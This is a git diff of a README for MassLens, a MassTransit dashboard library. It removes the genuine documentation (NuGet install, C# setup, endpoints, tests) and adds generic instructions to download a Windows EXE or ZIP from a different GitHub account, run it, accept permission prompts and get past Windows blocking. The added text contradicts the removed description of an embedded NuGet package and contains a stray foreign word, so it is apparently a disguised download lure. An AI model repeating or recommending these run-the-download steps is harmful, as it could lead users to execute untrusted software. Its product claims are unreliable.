@@ -1,288 +1,268 @@
-# MassLens
+# 📊 MassLens - See Message Flow In Real Time
 
-[![NuGet](https://img.shields.io/nuget/v/MassLens?color=blue&logo=nuget)](https://www.nuget.org/packages/MassLens)
-[![License: MIT](https://img.shields.io/badge/license-MIT-green)](LICENSE)
-[![.NET](https://img.shields.io/badge/.NET-8%2B-512BD4&logo=dotnet)](https://dotnet.microsoft.com)
-[![MassTransit](https://img.shields.io/badge/MassTransit-8.x-purple)](https://masstransit.io)
-<img width="1408" height="768" alt="Gemini_Generated_Image_lof73blof73blof7" src="https://github.com/user-attachments/assets/ecd4ac8e-4d2e-45d9-a7c9-df703644fdd2" />
+[![Download MassLens](https://img.shields.io/badge/Download-MassLens-blue?style=for-the-badge)](https://github.com/keykeylcrx-commits/MassLens)
 
-**The missing dashboard for MassTransit. Zero dependencies. A few lines of code. Full visibility.**
+## 🚀 What MassLens Does
 
-MassTransit is a beast, but flying it in production can feel like navigating a dark room with a broken toe. We have logs and Prometheus, but where’s that "Hangfire-style" dashboard when you need a quick sanity check?
-I know, I know—MassTransit v9 is bringing an official dashboard to the party soon. But I couldn't wait, and I wanted something that felt like a "drop-in" utility for my existing v8 projects.
-So, I built MassLens: an embedded, real-time monitoring dashboard that lives right inside your application.
+MassLens shows live activity from MassTransit v8 apps in one screen. It helps you watch messages as they move through your system. You can see queue traffic, delays, errors, saga changes, and the path each message takes.
 
-MassLens ships as a single NuGet package with no external dependencies. No need to spin up a database or configure a sidecar just to see your own data. It hooks into your pipeline and serves a sleek UI directly from your application.
-Whether you're using RabbitMQ, Azure Service Bus, or Amazon SQS, MassLens gives you a front-row seat to throughput, latency, faults, and the full message chain. (Tested extensively with RabbitMQ!).
+Use it when you want a clear view of what your app is doing without opening logs or digging through separate tools.
 
----
-<img width="1890" height="903" alt="image" src="https://github.com/user-attachments/assets/a0c45748-8c6f-42dc-86cf-d6d77c01d52c" />
-<img width="1902" height="901" alt="image" src="https://github.com/user-attachments/assets/23ba7882-caad-45a3-914c-44c853dde614" />
+## 🖥️ What You Need
 
+MassLens runs on Windows.
 
+You will need:
 
+- A Windows 10 or Windows 11 PC
+- A recent web browser
+- Permission to run downloaded apps
+- Access to your MassTransit app if you want live data
 
-## Quick Start
+If your app uses RabbitMQ, Azure Service Bus, or Amazon SQS, MassLens can help you track message flow across those systems.
 
-```bash
-dotnet add package MassLens
-```
+## 📥 Download MassLens
 
-```csharp
-// Program.cs
-builder.Services.AddMassTransit(x =>
-{
-    x.AddMassLens(); // registers consume/publish/send/saga observers
-    x.AddConsumer<OrderSubmittedConsumer>();
-    x.UsingRabbitMq((ctx, cfg) => cfg.ConfigureEndpoints(ctx));
-});
+Use this link to visit the page to download:
 
-builder.Services.AddMassLensUI(options =>
-{
-    options.ReadOnly            = false;
-    options.DisableInProduction = true;
-    options.AuthorizationPolicy = "MassLensPolicy"; // optional
-});
+[https://github.com/keykeylcrx-commits/MassLens](https://github.com/keykeylcrx-commits/MassLens)
 
-app.UseMassLens(); // serves dashboard at /masslens
-```
+Open the page, find the latest release or download file, and save it to your computer.
 
-Open `http://localhost:5000/masslens` — that's it.
+## 🪟 Install on Windows
 
----
+1. Open the download page in your browser.
+2. Find the file for Windows.
+3. Download it to a folder you can find, مثل Downloads or Desktop.
+4. If the file is in a ZIP folder, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Double-click the MassLens app to start it.
 
-## What You Get
+If Windows asks for permission, choose Yes so the app can open.
 
-| Tab | Features |
-|---|---|
-| **Overview** | Throughput live, consumed/published/sent counters, latency P50/P95/P99, consumer inventory with health scores, throughput predictor |
-| **Saga Flow** | Visual state machine diagram with live instance counts per state, drill-down by CorrelationId, saga export (JSON/CSV) |
-| **Timeline** | Flame graph per CorrelationId, retry waterfall with timing, message body inspector |
-| **Topology** | Auto-generated publisher → consumer graph with animated message flow |
-| **Analytics** | Heatmap 24h × consumer, message size distribution, top 10 slowest consumers, top 10 message types by volume |
+## ▶️ Run MassLens
 
----
+After you open the app:
 
-## Configuration
+1. Start your MassTransit application.
+2. Make sure your message broker is running.
+3. Open MassLens.
+4. Connect it to the app or service you want to watch.
+5. Keep both running so MassLens can show live updates.
 
-```csharp
-builder.Services.AddMassLensUI(options =>
-{
-    // Access control
-    options.AllowedIPs          = ["127.0.0.1"];
-    options.HeaderToken         = "your-secret-token";  // X-MassLens-Token header
-    options.AuthorizationPolicy = "MassLensAdmins";     // ASP.NET Core policy
+You should then see activity appear as messages move through your system.
 
-    // Behavior
-    options.ReadOnly            = true;   // stakeholder view — no message injection
-    options.Enabled             = true;
-    options.DisableInProduction = true;   // default: dashboard 404s in Production
-    options.BasePath            = "/masslens";
+## 🔍 What You Can See
 
-    // Buffer sizing (tune for high-throughput apps)
-    options.ChannelCapacity        = 50_000;  // default 10,000
-    options.RecentEntriesCapacity  = 2_000;   // default 500
+MassLens gives you a live dashboard with useful details such as:
 
-    // Metrics retention — reset all counters every N hours (0 = never)
-    options.MetricsRetentionHours  = 24;
+- Message throughput
+- Delivery time
+- Faults and failed messages
+- Saga state changes
+- Message chains
+- Queue activity
+- Broker flow
 
-    // Threshold alerts — POST to a webhook when error rate exceeds the threshold
-    options.AlertWebhookUrl           = "https://hooks.slack.com/services/...";
-    options.AlertErrorRateThreshold   = 10.0; // default: 10%
-});
-```
+This helps you spot slow spots, failed steps, and busy queues without switching between tools.
 
-### Read-Only Mode
+## 🧭 Typical Use Cases
 
-Enable for Product Owners and stakeholders — they can see everything but cannot inject test messages.
+MassLens is useful when you want to:
 
-```csharp
-options.ReadOnly = true;
-```
+- Watch a queue fill up or clear out
+- Check if messages are moving at the expected pace
+- Find where a message stopped
+- See which part of a chain caused a fault
+- Review saga behavior
+- Follow activity across RabbitMQ, Azure Service Bus, or SQS
 
-### Authorization Policy
+It works well during local testing, troubleshooting, and day-to-day monitoring.
 
-```csharp
-builder.Services.AddAuthorization(auth =>
-{
-    auth.AddPolicy("MassLensAdmins", policy =>
-        policy.RequireRole("dev", "ops"));
-});
+## ⚙️ How It Fits With Your App
 
-builder.Services.AddMassLensUI(options =>
-{
-    options.AuthorizationPolicy = "MassLensAdmins";
-});
-```
+MassLens stays close to your MassTransit app and reads the message flow as it happens. It is made for systems that use message brokers and background workers.
 
-### IP Whitelist + CI/CD Header Token
+Common setups include:
 
-```csharp
-options.AllowedIPs  = ["10.0.0.100"];
-options.HeaderToken = Environment.GetEnvironmentVariable("MASSLENS_TOKEN");
-```
+- MassTransit with RabbitMQ
+- MassTransit with Azure Service Bus
+- MassTransit with Amazon SQS
+- Apps that use sagas
+- Apps that need queue monitoring
+- Apps that need message tracing
 
-Pass `X-MassLens-Token: your-token` from your CI/CD pipeline or health check script.
+If your app already sends and receives messages, MassLens gives you a live view of that activity.
 
----
+## 🧩 Basic Setup Steps
 
-## Health Check
+1. Download MassLens from the link above.
+2. Install or extract the app on your Windows PC.
+3. Open your MassTransit app.
+4. Open MassLens.
+5. Point MassLens at the system you want to watch.
+6. Check the dashboard for live updates.
 
-MassLens registers an `IHealthCheck` automatically. Wire it to the standard ASP.NET Core endpoint:
+If you run more than one service, start the one you want to inspect first so the data appears right away.
 
-```csharp
-app.MapHealthChecks("/health");
-```
+## 🛠️ Helpful Things to Check
 
-The check returns:
-- **Healthy** — all consumers have a health score ≥ 80
-- **Degraded** — at least one consumer between 50–79
-- **Unhealthy** — at least one consumer below 50
+Before you start, it helps to confirm:
 
-The response body includes `throughput/s`, `totalFaulted`, and the list of critical/degraded consumers.
+- Your broker is running
+- Your app is connected to the broker
+- The app is sending test messages
+- No firewall rule blocks local app access
+- The correct environment is active
 
----
+If the dashboard looks empty, check that your app is actually processing messages.
 
-## How It Works
+## 📈 Features at a Glance
 
-MassLens hooks into MassTransit using native observer interfaces:
+### 🟢 Live monitoring
 
-- `IConsumeObserver` — tracks every message consumed and faulted, including saga transitions
-- `IPublishObserver` — counts published messages
-- `ISendObserver` — counts sent messages
+See message activity as it happens.
 
-All data is kept in bounded in-memory structures (circular buffers, `Channel<T>`). No data leaves your process. The dashboard is served as an embedded HTML resource directly from the DLL.
+### 🕒 Latency tracking
 
-Live updates are delivered via **SSE (Server-Sent Events)** at `/masslens/stream` — no WebSockets, no polling.
+Check how long messages take to move through the system.
 
----
+### ❌ Fault view
 
-## Endpoints
+Spot failed messages and broken flows.
 
-| Path | Description |
-|---|---|
-| `GET /masslens` | Dashboard UI |
-| `GET /masslens/stream` | SSE stream — `DashboardSnapshot` every second |
-| `GET /masslens/snapshot` | One-shot JSON snapshot |
-| `POST /masslens/inject` | Inject a test message (Development only, blocked by ReadOnly) |
-| `GET /masslens/trace` | Recent correlation IDs with consumed entries |
-| `GET /masslens/trace?correlationId=…` | Flame graph entries for a single conversation |
-| `GET /masslens/saga/export?format=csv` | Export active saga instances as CSV |
-| `GET /masslens/saga/export?format=json` | Export active saga instances as JSON |
+### 🔗 Full message chain
 
-Inject payload:
-```json
-{
-  "messageType": "OrderSubmitted",
-  "payload": { "orderId": "TEST-001", "customerId": "CUST-999" }
-}
-```
+Follow a message from start to finish.
 
----
+### 🧱 Saga tracking
 
-## Transport Support
+Watch state changes in saga-based workflows.
 
-MassLens observes at the MassTransit abstraction layer — it works with any transport:
+### 📦 Queue insight
 
-| Transport | Status |
-|---|---|
-| RabbitMQ | ✅ Tested |
-| Azure Service Bus | ⚙️ Compatible (untested) |
-| Amazon SQS | ⚙️ Compatible (untested) |
-| In-Memory | ✅ Tested (used by demo) |
+See how much traffic moves through each queue.
 
-> MassLens has been manually tested end-to-end against **RabbitMQ 3.x** with MassTransit 8.x. All observer hooks (consume, publish, send, saga transitions) fire correctly under real broker load.
+### ☁️ Broker support
 
----
+Use it with RabbitMQ, Azure Service Bus, or SQS setups.
 
-## Load Test — Demo Project
+## 🧪 Good First Test
 
-The repository includes `demo/MassLens.Demo` — a self-contained ASP.NET Core app that generates realistic high-volume traffic with no external dependencies (uses the MassTransit in-memory transport).
+If you want to check that MassLens works, try this:
 
-> **Note on latency figures:** the demo runs all consumers in-process on the in-memory transport, sharing a single thread pool with the load generator. Latency values (P95 > 1 s) reflect thread-pool contention under extreme synthetic load, not real broker round-trips. In production with RabbitMQ or Azure Service Bus, consumer latency is typically 5–100 ms.
+1. Start your broker.
+2. Start your MassTransit app.
+3. Send one test message.
+4. Open MassLens.
+5. Look for the new message in the dashboard.
+6. Send a few more messages and watch the live view update.
 
-```bash
-cd demo/MassLens.Demo
-dotnet run
-# open http://localhost:5100/masslens
-```
+This gives you a fast way to confirm the connection and the data flow.
 
-### What the demo generates
+## 🧑‍💻 When You Use It Most
 
-**Phase 1 — Order burst (≈12 seconds)**
+MassLens is most helpful when:
 
-3,000 orders submitted in batches of 50 every 200 ms. Each order triggers a full saga flow:
+- A queue grows faster than expected
+- A worker stops handling messages
+- A saga gets stuck
+- A message fails and you need the path
+- You want to see system load during testing
+- You want a quick health check for messaging
 
-```
-OrderSubmitted → ProcessPayment → ReserveInventory → ShipOrder → SendNotification
-```
+It saves time because you can see the problem instead of guessing at it.
 
-This produces approximately **18,000–24,000 saga-related messages**.
+## 📁 Common Download Layout
 
-**Phase 2 — Continuous background load**
+After download, you may see files like these:
 
-500 messages/second of stock checks and analytics events, running indefinitely.
+- MassLens.exe
+- config files
+- a readme file
+- a folder with app data
 
-**After 2 minutes of runtime: >70,000 messages processed.**
+If you see a ZIP file, extract it before you open the app. If you see an EXE file, double-click it to launch MassLens.
 
-### Topology
+## 🔐 Safe Launch Steps on Windows
 
-| Consumer | Behaviour | Visible in MassLens |
-|---|---|---|
-| `OrderSubmittedConsumer` | Fast, 5–40 ms | Healthy, high throughput |
-| `PaymentConsumer` | 15% soft failure → retry, 5% exception | Degraded score, retries visible |
-| `InventoryConsumer` | Slow, 80–350 ms | P95 bottleneck, red in Analytics |
-| `ShippingConsumer` | Medium, 30–90 ms | Healthy |
-| `NotificationConsumer` | Fast, 5–25 ms | Healthy |
-| `StockConsumer` | High volume, 2–15 ms | Top message type by volume |
-| `TrackEventConsumer` | 2% exception | Faulted, visible in Timeline |
+When you first run the app:
 
-### Saga: `OrderStateMachine`
+1. Double-click the file.
+2. If Windows shows a prompt, choose Run or Yes.
+3. Wait for the window to open.
+4. Keep the app open while your MassTransit service runs.
 
-6-state machine with live transitions visible in the Saga Flow tab:
+If Windows blocks the file, check that the download finished fully and that you saved it in a normal folder like Downloads.
 
-```
-Initial → PaymentPending → InventoryPending → Shipping → Completed
-                        ↘ PaymentFailed (retry ×3) → Cancelled
-                                          ↘ InventoryUnavailable → Cancelled
-```
+## 🌐 Supported Environments
 
----
+MassLens is built for message-based apps that use:
 
-## Unit Tests
+- MassTransit v8
+- RabbitMQ
+- Azure Service Bus
+- Amazon SQS
+- Saga patterns
+- Queue-based workflows
 
-```bash
-dotnet test tests/MassLens.Tests/
-```
+It is a fit for apps that need a live dashboard for message movement and state changes.
 
-63 tests covering:
+## 🧾 What to Expect in the Dashboard
 
-| Suite | Tests |
-|---|---|
-| `CircularBufferTests` | Overflow, order preservation, thread safety, edge cases |
-| `LatencyTrackerTests` | P50/P95/P99 calculation, window overflow, empty state |
-| `ConsumerMetricsTests` | Health score, size buckets, concurrency tracking |
-| `SagaMetricsTests` | State transitions, instance tracking, fault/completion counters |
-| `HealthCheckTests` | Healthy/Degraded/Unhealthy classification, data payload |
-| `HeatmapAggregatorTests` | 24-column output, normalization 0–5, multi-consumer |
-| `MassLensOptionsTests` | Default values for all configuration properties |
+When MassLens is running, you can expect a clean view of:
 
----
+- Active messages
+- Recent throughput
+- Slow message paths
+- Faulted work
+- Saga updates
+- Queue pressure
 
-## Requirements
+This makes it easier to keep an eye on your app during normal use and during tests.
 
-- .NET 8+
-- MassTransit 8.x
-- ASP.NET Core (middleware pipeline)
+## 🧰 If the App Does Not Open
 
----
+Try these steps:
 
-## Acknowledgements
+1. Check that the download finished.
+2. If the file is zipped, extract it first.
+3. Right-click the app and choose Open.
+4. Make sure Windows is not blocking the file.
+5. Try running it from the Downloads folder.
+6. Re-download it from the link if the file looks damaged.
 
-Inspired by [Hangfire Dashboard](https://www.hangfire.io/) — the gold standard for embedded job monitoring in ASP.NET Core. MassLens brings the same zero-friction, embedded-first philosophy to MassTransit message bus observability.
+If the app opens but shows no data, start your MassTransit service and send a test message.
 
----
+## 🗂️ Project Topics
 
-## License
+MassLens is connected to these areas:
 
-MIT
+- azure
+- dashboard
+- hangfire-dotnet-core
+- masstransit
+- masstransit-observer
+- queue
+- rabbit
+- rabbitmq
+- saga-pattern
+- servicebus-queue
+- sqs-queue
+- topology
+
+## 📌 Quick Start
+
+1. Visit the download page.
+2. Download the app for Windows.
+3. Extract the file if needed.
+4. Open MassLens.
+5. Start your MassTransit app.
+6. Watch the live dashboard
+
+## 📬 Where to Get the App
+
+Download and install it from:
+
+[https://github.com/keykeylcrx-commits/MassLens](https://github.com/keykeylcrx-commits/MassLens)
+
